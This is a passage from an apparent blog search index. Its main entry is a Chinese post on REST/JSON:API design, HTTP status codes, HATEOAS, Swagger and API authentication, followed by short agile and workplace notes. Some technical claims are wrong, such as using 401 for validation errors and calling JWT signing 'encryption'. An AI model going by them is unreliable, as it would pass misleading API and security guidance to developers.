“articles”,<br>     “id”: “1”,<br>     “attributes”: {<br>         “title”: “Title for article”<br>          …<br>     },<br>     “relationships”: {},<br>     “links”: {<br>         “self”: “<a href="http://example.com/articles/1&quot;" target="_blank" rel="noopener">http://example.com/articles/1&quot;</a><br>     }<br> }</p><p><code></code></p><ul><li>id显而易见为唯一标识，可以为数字也可以为hash字符串，取决于后端实现</li><li>type 描述数据的类型，可以对应为数据模型的类名</li><li>attributes 代表资源的具体数据</li><li>relationships、links为可选属性，用来放置关联数据和资源地址等数据</li></ul><h3 id="errors-属性"><a href="#errors-属性" class="headerlink" title="errors 属性"></a>errors 属性</h3><p>这里的errors和data有一点不同，一般来说返回值中errors作为列表存在，因为针对每个资源可能出现多个错误信息。最典型的例子为，我们请求的对象中某些字段不符合验证要求，这里需要返回验证信息，但是HTTP状态码会使用一个通用的401，然后把具体的验证信息在errors给出来。</p><p><code></code></p><p>{<br>    “errors”: [<br>        {<br>            “code”: 10011,<br>            “title”: “Name can’t be null”<br>        },<br>        {<br>            “code”: 10011,<br>            “title”: “Content can’t be null”,<br>            “detail”: “”<br>        }<br>    ]<br>}</p><p><code></code></p><p>我们可以在title字段中给出错误信息，然后在detail中给出程序堆栈信息，这让调试更为方便。需要注意的一点是，我们在生产环节需要屏蔽部分敏感信息，因此我们在生产环境屏蔽了堆栈等其它敏感的错误信息。</p><h3 id="常用的返回码"><a href="#常用的返回码" class="headerlink" title="常用的返回码"></a>常用的返回码</h3><p>返回码这部分是我开始设计API最感到迷惑的地方，如果你去查看HTTP协议文档，哪里有大量的状态码让你无从下手。实际上我们能在真实环境中用到的并不多，这里会介绍几个典型的场景。</p><p><em>200 OK</em><br>200是一个最常用的状态码，当服务器成功处理请求时返回200，例如GET请求到某一个资源，或者更新、删除某资源。需要注意的是使用POST创建资源应该返回201。</p><p><em>201 Created</em></p><p>如果客户端发起一个POST请求，在Restful部分我们提到，POST为创建资源，如果服务器处理成功应该返回一个创建成功的标志，在HTTP协议中，201为新建成功的状态。</p><p>文档规定，服务器必须在data中返回ID和</p><p>下面是一个HTTP的返回例子：</p><p><code></code></p><p>HTTP/1.1 201 Created<br>Location: <a href="http://example.com/photos/550e8400-e29b-41d4-a716-446655440000" target="_blank" rel="noopener">http://example.com/photos/550e8400-e29b-41d4-a716-446655440000</a><br>Content-Type: application/vnd.api+json</p><p>{<br>  “data”: {<br>    “type”: “photos”,<br>    “id”: “550e8400-e29b-41d4-a716-446655440000”,<br>    “attributes”: {<br>      “title”: “Example for relationships and links”,<br>      “src”: “<a href="http://example.com/images/productivity.png&quot;" target="_blank" rel="noopener">http://example.com/images/productivity.png&quot;</a><br>    },<br>    “links”: {<br>      “self”: “<a href="http://example.com/photos/550e8400-e29b-41d4-a716-446655440000&quot;" target="_blank" rel="noopener">http://example.com/photos/550e8400-e29b-41d4-a716-446655440000&quot;</a><br>    }<br>  }<br>}</p><p><code></code></p><p>在HTTP协议中，2XX的状态码都表示成功，还有202、204等用的较少，就不做过多介绍了，4XX返回客户端错误，会重点介绍。</p><ul><li>401 *</li></ul><p>如果服务器在检查用户输入的时候，需要传入的参数不能满足条件，服务器可以给出401错误，标记客户端错误，需要客户端自查。</p><p><em>415 Unsupported Media Type</em><br>当服务器媒体类型Content-Type和Accept指定错误的时候，应该返回415。</p><ul><li>403 Forbidden *</li></ul><p>当客户端访问未授权的资源时，服务器应该返回403要求用户授权信息。</p><ul><li>404 Not Found *</li></ul><p>这个太常见了，当指定资源找不到时服务器应当返回404。</p><ul><li>500 Internal Server Error *</li></ul><p>当服务器发生任何内部错误时，应当返回500，并给出errors字段，必要的时候需要返回错误的code，便于查错。一般来说，500错误是为了区分4XX错误，包括任何服务器内部技术或者业务异常都应该返回500。</p><h3 id="HATEOAS"><a href="#HATEOAS" class="headerlink" title="HATEOAS"></a>HATEOAS</h3><p>这个时候有些同学应该会觉得上面的links和HATEOAS思想很像，那么HATEOAS是个什么呢，为什么又有一个陌生的名词要学。<br>实际上HATEOAS算作Restful风格的一部分，HATEOAS思想是既然Restful是利用HTTP协议来进行增删改查，那我们怎么在没有文档的情况下找到这些资源的地址呢，一种可行的办法就是在API的返回体里面加入导航信息，也就是links。这样就像HTML中的A标签实现了超文本文档一样，实现了超链接JSON文档。</p><p>超链接JSON文档是我造的一个词，它的真是名字是Hypermedia As The Engine Of Application State，中文叫做超媒体应用程序状态的引擎，网上很多讲它。但是它并不是一个很高大上的概念，在Restfu和JSONAPI部分我们都贯穿了HATEOAS思想。下面给出一个典型的例子进一步说明：</p><p>如果在某个系统中产品和订单是一对多的关系，那我们给产品的返回值可以定义为：</p><p><code></code></p><p>{<br>  “data”: {<br>    “type”: “products”,<br>    “id”: “550e8400-e29b-41d4-a716-446655440000”,<br>    “attributes”: {<br>      “title”: “Ember Hamster”,<br>    },<br>    “relationships”: {<br>        “orders”: {<br>          “links”: {<br>            “self”: “/base-bath/products/550e8400-e29b-41d4-a716-446655440000/orders”<br>          },<br>        }<br>    },<br>    “links”: {<br>      “self”: “/base-bath/products/550e8400-e29b-41d4-a716-446655440000”<br>    }<br>  }<br>}</p><p><code></code></p><p>从返回中我们能得到links中product的的资源地址，同时也能得到orders的地址，这样我们不需要客户端自己拼装地址，就能够得到请求orders的地址。如果我们严格按照HATEOAS开发，客户端只需要在配置文件中定义一个入口地址就能够完成所有操作，在资源地址发生变化的时候也能自动适配。</p><p>当然，在实际项目中要使用HATEOAS也要付出额外的工作量(包括开发和前后端联调)，HATEOAS只是一种思想，怎么在项目中使用也需要灵活应对了。</p><h3 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h3><p>在文档中还定义了分页、过滤、包含等更多内容，请移步文档：</p><pre><code>- 英文版：http://jsonapi.org/format/- 中文版：http://jsonapi.org.cn/format/ （PS：中文版更新不及时，请以英文文档为准）</code></pre><h2 id="API文档和Mock"><a href="#API文档和Mock" class="headerlink" title="API文档和Mock"></a>API文档和Mock</h2><p>即使是Ajax时代，实践前后端分离最痛苦的一件事就是怎么让前后端很好的合作。我经历某些项目中甚至没有文档，前后端开发者坐到一起口口相传，后来当调用第三方API的时候用word来编写API文档。这样的方式在编写和更新的时候带来巨大的工作量，并且人工处理非常容易出错。</p><p>在工作中先后尝试使用过apidocjs、swagger等工具来实现API文档输出、Mock server、文档共享等功能。</p><h3 id="apidocjs"><a href="#apidocjs" class="headerlink" title="apidocjs"></a>apidocjs</h3><p>apidocjs是生成文档最轻量的一种方式，apidocjs作为npm包发布，运行在nodejs平台上。原理为解析方法前面的注释，使用方法非常类似javadoc等程序接口文档生成工具，配置和使用都非常简单。因为只是解析代码注释部分，理论上和编程语言无关。</p><p>安装：</p><blockquote><p>npm install apidoc -g</p></blockquote><p>在需要输出文档的源代码中添加一个一个注释示例：</p><p><code></code><br>/**</p><ul><li>@api {get} /user/:id Request User information</li><li>@apiName GetUser</li><li>@apiGroup User<br>*</li><li>@apiParam {Number} id Users unique ID.<br>*</li><li>@apiSuccess {String} firstname Firstname of the User.</li><li>@apiSuccess {String} lastname  Lastname of the User.<br>*/</li></ul><p><code></code></p><p>最小化运行：</p><blockquote><p>apidoc -i myapp/ -o apidoc</p></blockquote><p>即可在apidoc中输出静态的html文档。如果指定配置文件apidoc.json可以定义更多的操作方式，也可以自定义一套html模板用于个性化显示你的API文档，另外在输出的HTML文档中附带有API请求的测试工具，可以在我文档中尝试调用API。</p><p>使用apidocjs只需要添加几个例如@api、@apiname、@apiParam等几个必要的注释即可，值得一提是@apiDefine可以定义变量避免重复书写，@apiGroup用来对api分组，@apiVersion可以在生成不同历史的文档。</p><h3 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h3><p>介绍完apidoc后，我们来认识下swagger，swagger应该是最完备的API 文档生成工具了。使用swagger能完成apidocjs提供的几乎全部功能。</p><p>Swagger有一整套关于API文档、代码生成、测试、文档共享的项目，分别是:</p><pre><code>- Swagger Editor 使用swagger editor编写文档定义yml文件，并生成swagger的json文件- Swagger UI 解析swagger的json并生成html静态文档- Swagger Codegen 可以通过json文档生成Java等语言里面的模板文件（模型文件）- Swagger Inspector Api自动化测试- Swagger Hub 共享swagger文档</code></pre><p>通常我们在讨论swagger时往往说得是Swagger UI，然而Swagger UI只是提供了把文档的定义文件（json、Yaml）渲染成html静态的HTML文档，</p><p>下面我们给一个例子看怎么在Spring boot中使用swagger</p><p>我们加入依赖：</p><p><code></code></p><dependency><br>            <groupid>io.springfox</groupid><br>            <artifactid>springfox-swagger-ui</artifactid><br>            <version>2.2.2</version><br>        </dependency><br>        <dependency><br>            <groupid>io.springfox</groupid><br>            <artifactid>springfox-swagger2</artifactid><br>            <version>2.2.2</version><br>        </dependency><p><code></code>    </p><p>加入一个config文件</p><p><code></code><br>@Configuration<br>@EnableSwagger2<br>public class SwaggerConfig {<br>    @Bean<br>    public Docket api() {<br>        return new Docket(DocumentationType.SWAGGER_2)<br>          .select()<br>          .apis(RequestHandlerSelectors.any())<br>          .paths(PathSelectors.any())<br>          .build();<br>    }<br>}</p><p><code></code></p><p>这是我们的controller</p><p><code></code><br>@RestController<br>public class CustomController {</p><pre><code>@RequestMapping(value = &quot;/custom&quot;, method = RequestMethod.POST)public String custom() {    return &quot;custom&quot;;}</code></pre><p>}</p><p><code></code></p><p>然后访问你的context下的/context/swagger-ui.html页面，你会看到一个非常简单API文档<br>{配图<a href="http://www.baeldung.com/swagger-2-documentation-for-spring-rest-api}" target="_blank" rel="noopener">http://www.baeldung.com/swagger-2-documentation-for-spring-rest-api}</a></p><h2 id="使用swagger前后端协作"><a href="#使用swagger前后端协作" class="headerlink" title="使用swagger前后端协作"></a>使用swagger前后端协作</h2><p>在过去的开发中，往往是后端开发者占主导，在前后端分离后让合作方式发生了变化。传统的方式往往是服务器开发者完成了API开发之后，前端开发者再开始共工作，在项目管理中这样产生时间线的依赖。理想的情况下，在需求明确的情况下，架构师设计，前后端应该能各自独立工作，并在最后进行集成测试即可。</p><p>前面提到了Swagger Editor，使用这个工具可以通过编写API定义文件（Yaml格式），它提供线上版本，也可以本地使用。通过生成API定义文件，就可以完成诸如生成HTML静态文档、模拟API数据等操作。</p><p>前端开发者可以通过swagger的node版本swagger-node自带的mock模式启动一个Mock server，然后根据约定模拟自己想要的数据。<br>关于在前端使用的mock server，实在太多，而且各有优劣，在附录中有一个清单。 </p><p>{}</p><p>后端开发者可以根据文档实现接口，最后按照文档联合调试即可。那么怎么自动化的验证我们后端的API实现是符合一定要求的呢，我会在后面的API测试部分中讲到一个叫做契约测试的方法，来保证服务器输出的API符合文档要求。</p><p>{TODO: 使用swagger的一个工作流图}</p><h3 id="中心文档"><a href="#中心文档" class="headerlink" title="中心文档"></a>中心文档</h3><p>在一个大型的团队中，可能会有几十个以上的项目同时提供了API，这种情况下如果每个应用都各自提供API文档就会变得很难管理，如果API文档绑定到应用服务上会带来一些无意义的损耗。</p><p>可以使用一个集中地服务来存放这些文档，类似于github的私有仓库，swagger同样也提供了类似的服务 - swaggerhub.com。</p><h2 id="附录：API文档和Mock工具清单"><a href="#附录：API文档和Mock工具清单" class="headerlink" title="附录：API文档和Mock工具清单"></a>附录：API文档和Mock工具清单</h2><p>使用或调研过的，API 文档生成工具</p><ul><li>apidoc</li><li>swagger </li><li>blue sprint</li><li>RAML</li></ul><p>使用或调研过得Mock工具清单</p><ul><li>wiremock </li><li>json-server</li><li>node-mock-server</li><li>node-mocks-http</li></ul><p>HTTP请求拦截器</p><ul><li>axios-mock-adapter</li><li>jquery-mockjax </li></ul><h2 id="认证-authentication-和授权-authorization"><a href="#认证-authentication-和授权-authorization" class="headerlink" title="认证 (authentication) 和授权 (authorization)"></a>认证 (authentication) 和授权 (authorization)</h2><p>首先，认证和授权是两个不同的概念，为了让我们的API更加安全和具有清晰地权限，理解认证和授权的不同就非常有必要了。<br>认证和授权在英文中同样是不同的单词。</p><p>认证是authentication，指的是当前用户的身份，当用户登陆过后系统便能追踪到他的身份（cookie或token）做出符合相应业务逻辑的操作。即使用户没有登录，大多数系统也会追踪他的身份，只是当做来宾或者匿名用户来处理。</p><p>授权则不同，授权指的是什么样的身份被允许访问某些资源，在获取到用户身份后继续检查用户的权限。主流的系统中通常采用基于用户组或者基于角色的策略来设计的。</p><h2 id="API和WEB的认证异同"><a href="#API和WEB的认证异同" class="headerlink" title="API和WEB的认证异同"></a>API和WEB的认证异同</h2><p>在构建API时，开发者会发现我们的认证方式和网页应用有一些不同，除了像ajax这种结合了web的技术外，我们总是强调我们的API是无状态的，Cookie便不被推荐使用。</p><p>使用Cookie的本质是用户第一次访问时服务器会分配一个Session ID，后面的请求中客户端都会带上这个ID作为当前用户的标志，因为HTTP本身是无状态的，Cookie属于一种构建于浏览器中实现状态的方式。上面我们说到API的设计是用来给客户端使用的，如果强行要求API的调用者管理Cookie也可以完成任务，但是毫无意义。</p><p>总而言之，web世界里认证的方式原理就是服务器存储一个key或者token来标识客户端每一次请求，现实中我们会见到各种自定义的实现，下面会介绍几种业界常见的做法。</p><h3 id="HTTP-Basic-Authentication"><a href="#HTTP-Basic-Authentication" class="headerlink" title="HTTP Basic Authentication"></a>HTTP Basic Authentication</h3><p>你一定用过这种方式，但不一定知道它是什么，在不久之前，当你访问一台家用路由器的管理界面，你会看到一个浏览器弹出表单，要求你输入用户密码。</p><p>在这背后，当用户输入完用户名密码后，浏览器帮你做了一个非常简单的操作</p><ul><li>组合用户名和密码然后Base64编码</li><li>给编码后的字符串添加Basic 前缀，然后设置名称为Authorization的header头部</li></ul><p>如果API提供HTTP Basic Authentication认证方式，那么客户端可以很简单传输用户名和密码</p><p><code></code>java</p><p>String usernamePassword = “username:password”;<br>String base64Credentials = new String(Base64.encodeBase64(usernamePassword.getBytes()));</p><p><code></code></p><p>这种方式实现起来非常简单，仍然有大量公司在一些不敏感的场景下使用，缺点也很明显。大家会觉得，Base64只能称为编码方式，而不是加密，实际上无需配置密匙的客户端并没有任何可靠地加密方式，我们都依赖SSL协议。这种方式的致命弱点是密码不会过期，一旦被盗用只能通过修改密码的方式。</p><h3 id="token"><a href="#token" class="headerlink" title="token"></a>token</h3><p>鉴于上面每次请求都会带上用户名密码的做法会带来风险，并且本地会保存用户密码，通常使用另外一种做法就是签发token。</p><p>客户端操作</p><ul><li>用户登录时，带上用户名和密码调用登录接口获取token</li><li>每一次业务请求的API都带上token，如果服务器返回token无效或者过期，要求用户重新登录</li></ul><p>服务器</p><ul><li>处理用户登录请求时，生成token并存储到数据库或缓存（推荐使用缓存，高速且自动过期）</li><li>处理用户业务请求时，查询token获取用户身份信息</li></ul><p>通常来说这是一种折中的方法，在大量项目中被实践，并且各种语言提供了非常成熟的生成token的库，当我们发现用户身份异常时可以主动撤销</p><h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>上面说到token只是一段无意义的字符串，并不包含用户信息，并且每次都需要从外部存储中查找。因此有人对token做了进一步优化，设计了一种自包含令牌 - 令牌签发后无需从服务器存储中检查是否合法，通过解析令牌就能获取令牌的过期、有效等信息。<br>这就是JWT JSON Web Token</p><p>简而言之，一个基本的JWT令牌为一段点分3段式结构。</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</p><p>解密后像这样</p><p>{<br>  ‘typ’: ‘JWT’,<br>  ‘alg’: ‘HS256’<br>}<br>{<br>  “sub”: “1234567890”,<br>  “name”: “John Doe”,<br>  “admin”: true<br>}</p><p>生成JWT 令牌的流程为</p><ul><li>第一部分json base64编码为令牌第一部分</li><li>第二部分json base64编码为令牌第二部分</li><li>拼装第一、第二部分编码后的json以及secret进行sha256加密为令牌的第三部分</li></ul><p>因此只需要加密的secret就能解开JWT令牌，如果在数据中加入用户ID、过期信息就可以实现验证令牌是否有效、过期了。</p><h4 id="撤销JWT令牌"><a href="#撤销JWT令牌" class="headerlink" title="撤销JWT令牌"></a>撤销JWT令牌</h4><p>因为JWT是自包含令牌，不需要存储到数据库/缓存中，因此在使用过程中不得不考虑的一个特性就是无法被撤回。如果在某些场合使用了JWTtoken但是考虑到需要撤回，可以自己实现这部分逻辑。</p><p>目前业界最好的方案是采用一个高速key/value数据库，例如Redis，我们可以保存需要撤回的JWT token，当请求发生时，系统只在Redis中查询有效期内的令牌。因为撤回的JWT令牌只占所有的签发的令牌一小部分，以及Redis高效的索引机制，一般不会有性能上的问题。</p><h3 id="access-key"><a href="#access-key" class="headerlink" title="access key"></a>access key</h3><p>在服务器调用API的场景下，很多服务提供了另外一种模式，对于特定的API，它的调用者可能是另外一台服务器，这就需要认证信息需要很稳定，也极少存在key丢失的情况。例如在微信公众号的开发中，应用服务器需要保存认证信息并和微信服务器进行对接。</p><p>这种情况下，API提供者可以在用户的管理dashboard中生成一个key，并且只显示一次，如果失效或丢失重新生成即可，API提供者只需要每次请求中取出key，然后在数据库或缓存中对比即可。</p><p>这种认证方式非常简单，只需要保证生成key的方式，防止撞库（Hash算法的特性，不同的输入可能产生相同的hash值）的发生就能保证安全。</p><h3 id="AK-SK-参数签名认证"><a href="#AK-SK-参数签名认证" class="headerlink" title="AK/SK 参数签名认证"></a>AK/SK 参数签名认证</h3><p>ak=aknumber&amp;home=world&amp;name=hello&amp;work=java&amp;timestamp=now&amp;nonce=random”</p><h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><ul><li>DDOS</li><li>重放攻击</li><li>csrf攻击</li></ul>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一个好的项目需要哪些周边生态?</title>
      <link href="/agile/agile/ecosystem-for-project/"/>
      <url>/agile/agile/ecosystem-for-project/</url>
      
        <content type="html"><![CDATA[<p>一个项目可以做的很完善,也可以做的很简单,这篇文章就是总结了一个清单,来讨论我们在一个敏捷项目中可以做的比较完善的东西,比如CI/CD</p><h2 id="质量内建"><a href="#质量内建" class="headerlink" title="质量内建"></a>质量内建</h2><ol><li>Check style - 代码风格检查</li><li>Test coverage - 测试覆盖率</li><li>fortify - Java代码静态分析</li><li>TDD - 测试驱动开发</li><li>Eslint - 前端代码检查</li></ol><h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><ol><li>Penetration - 渗透测试</li></ol><h2 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h2><ol><li>CI/CD 持续部署</li><li>Git Flow - 基于git的团队协作方式</li><li>Retro - 敏捷中反思项目的会议</li></ol><h2 id="监控恢复"><a href="#监控恢复" class="headerlink" title="监控恢复"></a>监控恢复</h2><ol><li>monitoring<ul><li>Ahportal - 一种监控的实现方式</li></ul></li><li>DR - 灾难恢复方案</li></ol><h2 id="度量"><a href="#度量" class="headerlink" title="度量"></a>度量</h2><ol><li>CPU、内存、磁盘使用率</li><li>Max request量</li><li>AB 测试</li></ol><h2 id="环境管理"><a href="#环境管理" class="headerlink" title="环境管理"></a>环境管理</h2><ol><li>infrastructure as code - 根据项目代码创建基础设施</li><li>immutable infrastructure - 每次部署创建新的服务器</li><li>DB migration</li></ol><h2 id="分布式解耦"><a href="#分布式解耦" class="headerlink" title="分布式解耦"></a>分布式解耦</h2><ol><li>micro-service 微服务</li><li>SPA Project - 前后端分离</li></ol><h2 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h2><ol><li>Blue-Green - 蓝绿部署</li><li>Gray - 灰度发布</li></ol>]]></content>
      
      
      <categories>
          
          <category> agile </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>领域驱动设计</title>
      <link href="/agile/agile/domain%20driven%20design/"/>
      <url>/agile/agile/domain%20driven%20design/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是领域驱动设计？"><a href="#什么是领域驱动设计？" class="headerlink" title="什么是领域驱动设计？"></a>什么是领域驱动设计？</h2><p>领域驱动设计是一种设计软件系统的方法。类似的方法有UML、ER图。</p><h2 id="资源推荐"><a href="#资源推荐" class="headerlink" title="资源推荐"></a>资源推荐</h2><ul><li>《》</li></ul>]]></content>
      
      
      <categories>
          
          <category> agile </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>敏捷开发 Way of working</title>
      <link href="/agile/agile/Way%20of%20working/"/>
      <url>/agile/agile/Way%20of%20working/</url>
      
        <content type="html"><![CDATA[<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>敏捷开发流程中的一些很好的工作方式，本文中使用的敏捷方法为Scrum</p><h2 id="建卡"><a href="#建卡" class="headerlink" title="建卡"></a>建卡</h2><p>BA负责建story卡，如果其他人需要建立卡片，需要告知BA</p><h2 id="three-amigos"><a href="#three-amigos" class="headerlink" title="three amigos"></a>three amigos</h2><p>BA DEV QA 三方catchup，澄清卡的需求，然后BA移动到当前迭代</p><h2 id="estimation"><a href="#estimation" class="headerlink" title="estimation"></a>estimation</h2><p>BA发起全员来进行估算工作量，并澄清需求</p><p>估点数量按照斐波那契数列例如 1 2 3 5，超过5个点的卡需要被拆分</p><h2 id="ready-for-dev"><a href="#ready-for-dev" class="headerlink" title="ready for dev"></a>ready for dev</h2><p>BA把卡移动到ready for dev，然后开发就可以开始工作</p><h2 id="development"><a href="#development" class="headerlink" title="development"></a>development</h2><p>Dev需要和BA、QA领卡，kick off然后开始工作，每个卡需要建立一个branch，完成工作后需要检查pipeline是否通过然后，创建Pull request，然后该卡可以移动到review</p><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><p>Review 环节需要找人approve PR</p><h2 id="Ready-for-test"><a href="#Ready-for-test" class="headerlink" title="Ready for test"></a>Ready for test</h2><p>合并代码到Master，和QA sign off后移动故事卡到Ready for test</p>]]></content>
      
      
      <categories>
          
          <category> agile </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Tips to upgrade the relationship with colleagues</title>
      <link href="/method/Way%20of%20working%20for%20team%20building/"/>
      <url>/method/Way%20of%20working%20for%20team%20building/</url>
      
        <content type="html"><![CDATA[<h3 id="一些tips"><a href="#一些tips" class="headerlink" title="一些tips"></a>一些tips</h3><ul><li>关注人的感受, 多表达感谢, 不要直接批评</li></ul><h3 id="从Thoughtworks学到的"><a href="#从Thoughtworks学到的" class="headerlink" title="从Thoughtworks学到的"></a>从Thoughtworks学到的</h3><ul><li><p>Retro 回顾一段时间里的感受,然后在团队里面头脑风暴,使用sticker写出每个人的想法。使用well、less well、suggestion来分类,最后总结出actions。</p></li><li><p>Feedback meeting 互相给每个人Feedback, 直到Team中每个人都能收到Feedback</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> method </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Handover tips</title>
      <link href="/method/Way%20of%20working%20for%20handover/"/>
      <url>/method/Way%20of%20working%20for%20handover/</url>
      
        <content type="html"><![CDATA[<h4 id="What-we-can-do-fo-that"><a href="#What-we-can-do-fo-that" class="headerlink" title="What we can do fo that?"></a>What we can do fo that?</h4><ul><li>整理一个清单</li><li>建立一个文档去跟踪</li><li>安排一些conversation去移交</li><li>review 那些东西已经被确认接受</li><li>角色对角色, QA、DEV、BA分别处理</li><li>定义移交scope</li><li>定义deadline</li></ul>]]></content>
      
      
      <categories>
          
          <category> method </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>怎么样快速入门/学习一项技术</title>
      <link href="/method/How%20to%20learn%20something%20quickly/"/>
      <url>/method/How%20to%20learn%20something%20quickly/</url>
      
        <content type="html"><![CDATA[<h2 id="技术类知识学习的流程"><a href="#技术类知识学习的流程" class="headerlink" title="技术类知识学习的流程"></a>技术类知识学习的流程</h2><ol><li>回答几个问题<ul><li>这项技术是什么？</li><li>这项技术的意义？</li><li>这项技术的定位？</li><li>为什么需要学习这项技术  </li></ul></li><li>收集入门教程</li><li>阅读入门教程产出笔记或者思维导图</li><li>使用小项目练习</li><li>阅读官方文档了解更多</li><li>搞懂原理（可选）</li></ol><h2 id="学习一门新技术的要点"><a href="#学习一门新技术的要点" class="headerlink" title="学习一门新技术的要点"></a>学习一门新技术的要点</h2><ul><li>咨询有经验的人，需要提前准备问题，寻求一些好的资料和书籍</li><li>阅读速度不宜过快，安排大块时间。step by step</li><li>一定要有产出</li><li>可以编写一些例子和demo放到wiki中</li></ul>]]></content>
      
      
      <categories>
          
          <category> method </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Typescripts 基础知识</title>
      <link href="/javascript/Type%20scripts/"/>
      <url>/javascript/Type%20scripts/</url>
      
        <content type="html"><![CDATA[<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>官网: <a href="http://www.typescriptlang.org/" target="_blank" rel="noopener">http://www.typescriptlang.org/</a><br>中文网: <a href="https://www.tslang.cn" target="_blank" rel="noopener">https://www.tslang.cn</a></p>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>How to end a meeting?</title>
      <link href="/english/How%20to%20wrap%20up/"/>
      <url>/english/How%20to%20wrap%20up/</url>
      
        <content type="html"><![CDATA[<h2 id="some-of-usages"><a href="#some-of-usages" class="headerlink" title="some of usages"></a>some of usages</h2><ul><li>“any questions”</li><li>“any comments”</li><li>“any other updates”</li></ul><h2 id="Summarize"><a href="#Summarize" class="headerlink" title="Summarize"></a>Summarize</h2><ul><li>“Today we have covered”</li><li>“in this meeting we have discussed”</li><li>“The main points that I’d like to sum up are”</li><li>“To summarize today’s meeting”</li><li>“Let me summarize what we have talked about today before we finish”</li></ul><h2 id="重点单词"><a href="#重点单词" class="headerlink" title="重点单词"></a>重点单词</h2><ul><li>Sum up 口语上的summarize</li><li>Recap 复盘，重述</li></ul><h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><p>express the time run out of time</p><ul><li>it seems as though we’ve run out of time for today</li><li>Unfortunately we are out of time </li></ul><p>express to close a meeting </p><ul><li>Let’s call a day</li><li>Let’s wrap up</li><li>that’s all for our meeting</li></ul>]]></content>
      
      
      <categories>
          
          <category> english </category>
          
      </categories>
      
      
    </entry>
    
  
  
</search>
